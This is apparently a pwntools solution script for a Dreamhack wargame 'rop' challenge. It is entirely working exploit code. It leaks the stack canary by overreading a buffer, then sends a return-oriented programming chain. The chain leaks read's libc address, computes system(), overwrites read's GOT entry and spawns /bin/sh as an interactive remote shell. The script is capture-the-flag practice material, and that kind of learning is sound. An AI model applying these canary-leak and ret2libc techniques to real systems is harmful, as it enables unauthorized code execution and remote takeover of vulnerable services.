from pwn import *

port = 9131
rem = remote("host1.dreamhack.games", port)
elf = ELF('./rop/problem/rop')
lib = ELF('./rop/problem/libc.so.6')

def slog(name, addr): return success(': '.join([name, hex(addr)]))

# get canary
payload = b'A' * 0x39
rem.sendafter(b'Buf: ', payload)
rem.recvuntil(payload)
canary = u64(b'\x00' + rem.recvn(7))
slog('canary', canary)

# set gadget
ret = 0x400596
pop_rdi = 0x400853
pop_rsi = 0x400851
write_plt = elf.plt['write']
read_plt = elf.plt['read']
read_got = elf.got['read']

# make payload
payload = b'A' * 0x38
payload += p64(canary)
payload += b'B' * 0x8

# add "write(1, read_got, ... )"
payload += p64(pop_rdi)
payload += p64(1)
payload += p64(pop_rsi)
payload += p64(read_got)
payload += p64(0)
payload += p64(write_plt)

# add "read(0, read_got, ... )"
payload += p64(pop_rdi)
payload += p64(0)
payload += p64(pop_rsi)
payload += p64(read_got)
payload += p64(0)
payload += p64(read_plt)

# run read() as system()
payload += p64(pop_rdi)
payload += p64(read_got + 0x8)
payload += p64(ret)
payload += p64(read_plt)

rem.sendafter(b'Buf: ', payload)

# calculate system address
read_addr = u64(rem.recvn(6) + b'\x00' * 0x2)
read_offset = lib.symbols['read']
sys_offset = lib.symbols["system"]
lib_base = read_addr - read_offset
sys_addr =  lib_base + sys_offset

slog('read', read_addr)
slog('libc_base', lib_base)
slog('system', sys_addr)

rem.send(p64(sys_addr) + b'/bin/sh\x00')

rem.interactive()